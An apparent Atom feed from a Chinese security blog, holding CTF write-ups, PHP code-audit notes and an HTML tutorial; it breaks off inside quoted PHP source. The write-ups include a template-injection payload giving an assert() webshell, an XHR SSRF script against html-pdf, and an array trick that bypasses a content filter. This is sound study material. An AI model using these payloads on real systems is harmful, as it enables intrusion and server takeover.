<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Αιώνιος</title>
  
  <subtitle>The value of life lies not length of days, but in the use of we make of them.</subtitle>
  <link href="http://daweitech.github.io/atom.xml" rel="self"/>
  
  <link href="http://daweitech.github.io/"/>
  <updated>2021-09-21T12:39:43.804Z</updated>
  <id>http://daweitech.github.io/</id>
  
  <author>
    <name>4v1d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web2 ikun</title>
    <link href="http://daweitech.github.io/2021/09/21/buu/22/"/>
    <id>http://daweitech.github.io/2021/09/21/buu/22/</id>
    <published>2021-09-21T12:26:05.000Z</published>
    <updated>2021-09-21T12:39:43.804Z</updated>
    
    <content type="html"><![CDATA[<p> 经历了一个上午AWD的被锤后</p><p>有点心灰意冷</p><p>做了好多题目都是跟着wp做的，没有什么收获</p><p>本来找了ly0n大佬取经了一下，结果发现自己还是基础没打好</p><p>这道题还是跟着wp做了一遍</p><p>先记录一下思路</p><p>进去之后是个购物页面，很多* li *li标志小电视的商品</p><p>按照提示，我们需要买lv6的才行</p><p>翻页寻找了好久都没有</p><p>原理是要用脚本跑一下啊</p><p>很快，找到了第180页有这个商品</p><p>但是太贵了，远远超出我们的钱包</p><p>于是抓包想修改折扣蒙混过关</p><p>好家伙，说没有以admin访问不行</p><p>然后知道了要从jwt入手，我觉得这个有点像令牌token和cookie吧</p><p>就是浏览器用这个东西来识别你的身份</p><p>进入jwt官方页面修改之后成功购买</p><p>查看源码</p><p>提示我们下载文件</p><p>下载之后就是难点python的pickle漏洞</p><p><strong>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<strong>reduce</strong>()函数从而触发恶意代码。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 经历了一个上午AWD的被锤后&lt;/p&gt;
&lt;p&gt;有点心灰意冷&lt;/p&gt;
&lt;p&gt;做了好多题目都是跟着wp做的，没有什么收获&lt;/p&gt;
&lt;p&gt;本来找了ly0n大佬取经了一下，结果发现自己还是基础没打好&lt;/p&gt;
&lt;p&gt;这道题还是跟着wp做了一遍&lt;/p&gt;
&lt;p&gt;先记录一下思路&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(三)</title>
    <link href="http://daweitech.github.io/2021/09/17/src/3/"/>
    <id>http://daweitech.github.io/2021/09/17/src/3/</id>
    <published>2021-09-17T12:20:23.000Z</published>
    <updated>2021-09-17T12:37:47.373Z</updated>
    
    <content type="html"><![CDATA[<p> 这次试着尝试审计bluecms漏洞</p><p>安装bluecms的教程文章：</p><p><a href="https://blog.csdn.net/qq_41209264/article/details/106773255">渗透测试——bluecms安装及seay代码审计_fallingskies-CSDN博客</a></p><p><a href="https://www.cnblogs.com/wkzb/p/12732078.html">php代码审计]bluecms v1.6 sp1 - beiwo - 博客园 (cnblogs.com)</a></p><p>遇到的一个小坑就是访问安装页面一直为空白，还好解决啦</p><p>上面的文章已经讲解得很详细了</p><p><img src="/2021/09/17/src/3/image-20210917202058053.png" alt="image-20210917202058053"></p><p>创建成功图如下：</p><p><img src="/2021/09/17/src/3/image-20210917202743734.png" alt="image-20210917202743734"></p><p>跟着大佬文章阅读：</p><p>[<a href="https://www.cnblogs.com/wkzb/p/12732078.html">php代码审计]bluecms v1.6 sp1 - beiwo - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 这次试着尝试审计bluecms漏洞&lt;/p&gt;
&lt;p&gt;安装bluecms的教程文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_41209264/article/details/106773255&quot;&gt;渗透测试——bluecms安装及se</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>漏洞挖掘演练(一)</title>
    <link href="http://daweitech.github.io/2021/09/17/src/2/"/>
    <id>http://daweitech.github.io/2021/09/17/src/2/</id>
    <published>2021-09-17T07:14:27.000Z</published>
    <updated>2021-09-17T12:38:27.457Z</updated>
    
    <content type="html"><![CDATA[<p>以下内容全部来自于：安恒信息</p><p>关于cms的源码</p><p><img src="/2021/09/17/src/2/image-20210917152538626.png" alt="image-20210917152538626"></p><p>gitee.com上可以找到很多资源</p><p>同样github也是。</p><p>例子一：</p><p><img src="/2021/09/17/src/2/image-20210917153534213.png" alt="image-20210917153534213"></p><p>观察以上代码，发现该php文件明显是该CMS的模板渲染核心代码</p><p>其中，对外调用paser_string函数，核心函数运行——parse,对各种标签进行解析。</p><p>所以联想到模板渲染常存在的SSTI漏洞</p><p><img src="/2021/09/17/src/2/image-20210917153916987.png" alt="image-20210917153916987"></p><p>看到在处理标签时运用诸多eval()函数</p><p>所以接下来思路为：</p><p>根据eval()函数，追踪溯源，看是否存在可控变量。</p><p>ps：没有审计经验的人，建议把关键函数提取出来到本地的PHP环境进行debug调试</p><p>主要想法就是传递什么样的参数可以在eval中执行，并且确定eval中执行的代码是哪一块，是否可控。</p><p>假设传递{if:123}456{endif}</p><p>根据逻辑推敲，最后代码回进入到该分支中</p><p>并且$strlf的值是123</p><p><img src="/2021/09/17/src/2/image-20210917154659350.png" alt="image-20210917154659350"></p><p>所以最后能够构成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(123)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>接着，就是注入代码来getshell了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)123&#123;endif&#125;</span><br></pre></td></tr></table></figure><p>拼接后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1&#125;assert($_POST[x];&#x2F;&#x2F;)&#123;isFlag&#x3D;true;&#125;else&#123;isFalse&#125;;</span><br></pre></td></tr></table></figure><p>分析：1为永真条件，//将后面的注释了</p><p>最后就执行了assert($_POST[x]);</p><p>我们继续找传递参数的地方</p><p>反向追踪，调用labelif()函数的是_parse(),而 _parse只被parse_string调用</p><p><img src="/2021/09/17/src/2/image-20210917155446820.png" alt="image-20210917155446820"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;以下内容全部来自于：安恒信息&lt;/p&gt;
&lt;p&gt;关于cms的源码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/17/src/2/image-20210917152538626.png&quot; alt=&quot;image-20210917152538626&quot;&gt;&lt;/p&gt;
&lt;p&gt;gite</summary>
      
    
    
    
    
    <category term="src" scheme="http://daweitech.github.io/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>PHP and MySQL Web Development(二)</title>
    <link href="http://daweitech.github.io/2021/09/15/php/3/"/>
    <id>http://daweitech.github.io/2021/09/15/php/3/</id>
    <published>2021-09-15T13:19:28.000Z</published>
    <updated>2021-09-15T13:20:40.278Z</updated>
    
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>runoob.com-html(1)</title>
    <link href="http://daweitech.github.io/2021/09/13/web/0/"/>
    <id>http://daweitech.github.io/2021/09/13/web/0/</id>
    <published>2021-09-13T14:01:57.000Z</published>
    <updated>2021-09-14T08:38:25.388Z</updated>
    
    <content type="html"><![CDATA[<p>1.HTML文档的后缀名</p><p>.html                .htm</p><p>2.实例解析</p><p><img src="/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; 声明为 HTML5 文档</span><br><span class="line">&lt;html&gt; 元素是 HTML 页面的根元素</span><br><span class="line">&lt;head&gt; 元素包含了文档的元（meta）数据，如 &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; 定义网页编码格式为 utf-8。</span><br><span class="line">&lt;title&gt; 元素描述了文档的标题</span><br><span class="line">&lt;body&gt; 元素包含了可见的页面内容</span><br><span class="line">&lt;h1&gt; 元素定义一个大标题</span><br><span class="line">&lt;p&gt; 元素定义一个段落</span><br></pre></td></tr></table></figure><p>HTML 是用来描述网页的一种语言。</p><p>HTML 指的是超文本标记语言: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</p><p>HTML标签</p><p>HTML元素</p><p>HTML网页结构</p><p><img src="/2021/09/13/web/0/image-20210913221500807.png" alt="image-20210913221500807"></p><p>文档格式例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &lt;div&gt;分类目录...&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div&gt;当前分类内容列表...&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt; </span><br></pre></td></tr></table></figure><p>常用标签介绍：</p><p>文本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最常用：&lt;font&gt;,用于改变字体，字号文字颜色</span><br></pre></td></tr></table></figure><p>图片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;hr&gt;标签用于在页面上添加图片，src属性指定图片的地址，如果无法打开src指定的图片，浏览器通常会在页面上需要显示图片的地方显示alt属性定义的文本。</span><br><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;图片简介&quot; &#x2F;&gt; </span><br></pre></td></tr></table></figure><p>链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">超级链接用&lt;a&gt;标签表示，href属性指定了链接到的地址。&lt;a&gt;标签可以包含文本，也可以包含图片。</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;&quot;&gt;菜鸟教程&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;http:&#x2F;&#x2F;validator.w3.org&quot;&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;Icons&#x2F;valid-xhtml10&quot; alt&#x3D;&quot;验证HTML&quot; &#x2F;&gt;&lt;&#x2F;a&gt; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.HTML文档的后缀名&lt;/p&gt;
&lt;p&gt;.html                .htm&lt;/p&gt;
&lt;p&gt;2.实例解析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/09/13/web/0/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg&quot;&gt;</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2021祥云杯 secrets_of_admin&amp;crwaler_z</title>
    <link href="http://daweitech.github.io/2021/09/07/buu/21/"/>
    <id>http://daweitech.github.io/2021/09/07/buu/21/</id>
    <published>2021-09-07T02:52:39.000Z</published>
    <updated>2021-09-14T11:39:07.493Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/rfrder/article/details/119914746">祥云杯2021 Web复现_feng的博客-CSDN博客</a></p><p>[祥云杯2021 web wp | Z3ratu1’s blog](<a href="https://blog.z3ratu1.cn/%E7%A5%A5%E4%BA%91%E6%9D%AF2021">https://blog.z3ratu1.cn/祥云杯2021</a> wp.html#more)</p><p><a href="https://cbatl.gitee.io/">ly0n - A hard-working boy (gitee.io)</a></p><p><a href="https://www.freebuf.com/articles/system/178150.html">Linux下几种反弹Shell方法的总结与理解 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.wlhhlc.top/posts/20107/#cralwer-z">2021祥云杯WEB-WP | dota_st (wlhhlc.top)</a></p><h4 id="secrets-of-admin"><a href="#secrets-of-admin" class="headerlink" title="secrets_of_admin"></a>secrets_of_admin</h4><p>打开后页面如下：</p><p><img src="/2021/09/07/buu/21/image-20210908114725080.png" alt="image-20210908114725080"></p><p>database.js里直接给出用户名和密码：</p><p>Username：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br></pre></td></tr></table></figure><p>Password：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</span><br></pre></td></tr></table></figure><p>登录后就有了上传界面</p><p><img src="/2021/09/07/buu/21/image-20210908114945704.png" alt="image-20210908114945704"></p><p>提示我们上传pdf类型的文件，又只能post传参</p><p>以下直<code>files</code>表可以知道，flag在<code>superuser</code>那里，但是<code>superuser</code>不能用。通过下面三行代码也可以知道，需要把<code>flag</code>给<code>admin</code>用户接摘抄wp（因为我没源码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let filename &#x3D; await DB.getFile(token.username, req.params.id)</span><br><span class="line">         if (fs.existsSync(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)))&#123;</span><br><span class="line">             return res.send(await readFile(path.join(__dirname , &quot;..&#x2F;files&#x2F;&quot;, filename)));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是/api/files/功能那里需要SSRF。</p><p>通过查找html-pdf库发现它存在一个任意文件读取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html-pdf before version 3.0.1 is vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as request.open(&quot;GET&quot;,&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;) will result in a PDF document with the contents of &#x2F;etc&#x2F;passwd.</span><br></pre></td></tr></table></figure><p>因此可以利用制造pdf的功能来实现ssrf，把flag给admin用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=1&quot;</span>, <span class="literal">true</span>);xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>而且filename字段是UNIQUE，需要不能直接flag，用./flag。</p><p>但是有个问题就是这个过滤：</p><pre><code>if ( content == &#39;&#39; || content.includes(&#39;&lt;&#39;) || content.includes(&#39;&gt;&#39;) || content.includes(&#39;/&#39;) || content.includes(&#39;script&#39;) || content.includes(&#39;on&#39;))&#123;    // even admin can&#39;t be trusted right ? :)      return res.render(&#39;admin&#39;, &#123; error: &#39;Forbidden word 🤬&#39;&#125;);&#125; else &#123;</code></pre><p>当时自己就卡在了这里，不知道怎么绕过。关键就在于node.js的弱类型和php的弱类型有所不同。js中数组和字符串拼接的话，比如[“hello”]+”world”，得到的是helloworld，而php里确实Arrayworld。也是因为深受php的影响，所以没想到这里可以用数组来绕过，记得URL编码</p><p>然后我是丢进bp里，只需要content改成content[],传数组</p><p><img src="/2021/09/07/buu/21/image-20210908115802410.png" alt="image-20210908115802410"></p><p><img src="/2021/09/07/buu/21/image-20210908120122404.png" alt="image-20210908120122404"></p><p>出现这个页面就是成功</p><p><img src="/2021/09/07/buu/21/image-20210908120634020.png" alt="image-20210908120634020"></p><p>打开后就有flag</p><p><img src="/2021/09/07/buu/21/image-20210908120715884.png" alt="image-20210908120715884"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/rfrder/article/details/119914746&quot;&gt;祥云杯2021 Web复现_feng的博客-CSDN博客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;[祥云杯2021 web wp | Z3ratu1’s blog</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>php代码审计(三)</title>
    <link href="http://daweitech.github.io/2021/09/05/php/2/"/>
    <id>http://daweitech.github.io/2021/09/05/php/2/</id>
    <published>2021-09-05T12:48:43.000Z</published>
    <updated>2021-09-05T13:04:00.433Z</updated>
    
    <content type="html"><![CDATA[<p> 这是一次对单独文章的分析</p><p>来自于安全客：</p><p><a href="https://www.anquanke.com/post/id/250537">ThinkPHP 3.2.3 漏洞复现 - 安全客，安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 这是一次对单独文章的分析&lt;/p&gt;
&lt;p&gt;来自于安全客：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/250537&quot;&gt;ThinkPHP 3.2.3 漏洞复现 - 安全客，安全资讯平台 (anquanke.com)&lt;/a&gt;</summary>
      
    
    
    
    
    <category term="php" scheme="http://daweitech.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 2020 总决赛 Novel&amp;GameExp</title>
    <link href="http://daweitech.github.io/2021/09/04/buu/20/"/>
    <id>http://daweitech.github.io/2021/09/04/buu/20/</id>
    <published>2021-09-04T07:24:15.000Z</published>
    <updated>2021-09-07T12:35:03.912Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Novel"><a href="#Novel" class="headerlink" title="Novel:"></a>Novel:</h4><p>参考博客：</p><p><a href="https://www.cnblogs.com/W4nder/p/14078695.html">网鼎杯2020线下web - W4nder - 博客园 (cnblogs.com)</a></p><p><a href="https://mount4in.github.io/2020/12/08/2020%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9BWeb%E9%A2%98%E7%9B%AEwriteup/">2020第二届网鼎杯半决赛Web题目writeup | Mount4in</a></p><p>在buu上下载了源文件</p><p><img src="/2021/09/04/buu/20/image-20210905094734716.png" alt="image-20210905094734716"></p><p>先看看index.php</p><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">defined(&#39;DS&#39;) or define(&#39;DS&#39;, DIRECTORY_SEPARATOR);</span><br><span class="line">define(&#39;APP_DIR&#39;, realpath(&#39;.&#x2F;&#39;));</span><br><span class="line">error_reporting(0);</span><br><span class="line">function autoload_class($class)&#123;</span><br><span class="line">foreach(array(&#39;class&#39;) as $dir)&#123;</span><br><span class="line">$file &#x3D; APP_DIR.DS.$dir.DS.$class.&#39;.class.php&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">if(file_exists($file))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $file;</span><br><span class="line">include_once $file;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function upload($config)&#123;</span><br><span class="line">$upload_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">foreach(array(&#39;file&#39;,&#39;method&#39;) as $param)&#123;</span><br><span class="line">$upload_config[&#39;data&#39;][$param]&#x3D;$config[$param];</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; var_dump($upload_config);</span><br><span class="line">return $upload_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function home($config)&#123;</span><br><span class="line">$home_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$home_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">return $home_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function back($config)&#123;</span><br><span class="line">$copy_config[&#39;class&#39;]&#x3D;$config[&#39;class&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;method&#39;]&#x3D;$config[&#39;method&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;filename&#39;]&#x3D;$config[&#39;post&#39;][&#39;filename&#39;];</span><br><span class="line">$copy_config[&#39;data&#39;][&#39;dest&#39;]&#x3D;$config[&#39;post&#39;][&#39;dest&#39;];</span><br><span class="line">return $copy_config;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spl_autoload_register(&#39;autoload_class&#39;);</span><br><span class="line"></span><br><span class="line">$request&#x3D;isset($_SERVER[&#39;REQUEST_URI&#39;])?$_SERVER[&#39;REQUEST_URI&#39;]:&#39;&#x2F;&#39;;</span><br><span class="line"></span><br><span class="line">$config[&#39;get&#39;]&#x3D;$_GET;</span><br><span class="line">$config[&#39;post&#39;]&#x3D;$_POST;</span><br><span class="line">$config[&#39;file&#39;]&#x3D;$_FILES;</span><br><span class="line"></span><br><span class="line">$parameters&#x3D;explode(&#39;&#x2F;&#39;,explode(&#39;?&#39;, $request)[0]);</span><br><span class="line">$class&#x3D;(isset($parameters[1]) &amp;&amp; !empty($parameters[1]))?$parameters[1]:&#39;home&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$method&#x3D;(isset($parameters[2]) &amp;&amp; !empty($parameters[2]))?$parameters[2]:&#39;index&#39;;</span><br><span class="line">&#x2F;&#x2F; echo $method;</span><br><span class="line"></span><br><span class="line">$config[&#39;class&#39;]&#x3D;$class;</span><br><span class="line">$config[&#39;method&#39;]&#x3D;$method;</span><br><span class="line"></span><br><span class="line">if(!empty($class))&#123;</span><br><span class="line">if(in_array($class, array(&#39;upload&#39;,&#39;home&#39;,&#39;back&#39;)))&#123;</span><br><span class="line">&#x2F;&#x2F; echo $class;</span><br><span class="line">$class_init_config&#x3D;call_user_func($class, $config);</span><br><span class="line">&#x2F;&#x2F; print_r($class_init_config);</span><br><span class="line">new $class_init_config[&#39;class&#39;]($class_init_config[&#39;data&#39;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.php中实现了有一个类自动加载，可以以<code>http://ip/class/method</code>的形式去调用对应类的函数</p><p>//类自动加载</p><p><a href="https://www.php.net/manual/zh/language.oop5.autoload.php">https://www.php.net/manual/zh/language.oop5.autoload.php</a></p><p><img src="/2021/09/04/buu/20/image-20210905095559300.png" alt="image-20210905095559300"></p><p><img src="/2021/09/04/buu/20/image-20210905095718327.png" alt="image-20210905095718327"></p><p>然后在<code>class</code>文件夹中有三个文件，分别为</p><p><code>home.class.php</code>、 <code>upload.class.php</code> 、<code>back.class.php</code>，分别对应主页、上传和备份功能的实现，接下来审计这三个文件</p><p>我们采用分而置之来分析</p><p>1.upload.class.php，上传功能</p><p><img src="/2021/09/04/buu/20/image-20210905100016508.png" alt="image-20210905100016508"></p><p>文件被上传到<code>profile</code>目录下，文件名可控，但是其后缀进行了限制，只能用txt，然后就是大小限制。</p><p>PHP in_array() 函数</p><p>定义和用法</p><p>in_array() 函数搜索数组中是否存在指定的值。</p><p><strong>注释：</strong>如果 <em>search</em> 参数是字符串且 <em>type</em> 参数被设置为 TRUE，则搜索区分大小写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">必需。规定要在数组搜索的值。</td></tr><tr><td align="left"><em>array</em></td><td align="left">必需。规定要搜索的数组。</td></tr><tr><td align="left"><em>type</em></td><td align="left">可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。</td></tr></tbody></table><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$people &#x3D; array(&quot;Bill&quot;, &quot;Steve&quot;, &quot;Mark&quot;, &quot;David&quot;);</span><br><span class="line"></span><br><span class="line">if (in_array(&quot;Mark&quot;, $people))</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;匹配已找到&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;匹配未找到&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>echo “匹配已找到”</p><p>2.backup.class.php,备份功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class back&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $method;</span><br><span class="line">    public $dest;</span><br><span class="line"></span><br><span class="line">    function __construct($config)&#123;</span><br><span class="line">        $this-&gt;filename&#x3D;$config[&#39;filename&#39;];</span><br><span class="line">        $this-&gt;method&#x3D;$config[&#39;method&#39;];</span><br><span class="line">        $this-&gt;dest&#x3D;$config[&#39;dest&#39;];</span><br><span class="line">        if(in_array($this-&gt;method, array(&#39;backup&#39;)))&#123;</span><br><span class="line">            $this-&gt;&#123;$this-&gt;method&#125;($this-&gt;filename, $this-&gt;dest);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                header(&#39;Location: &#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function backup($filename, $dest)&#123;</span><br><span class="line">        $filename&#x3D;&#39;profile&#x2F;&#39;.$filename;</span><br><span class="line">        if(file_exists($filename))&#123;</span><br><span 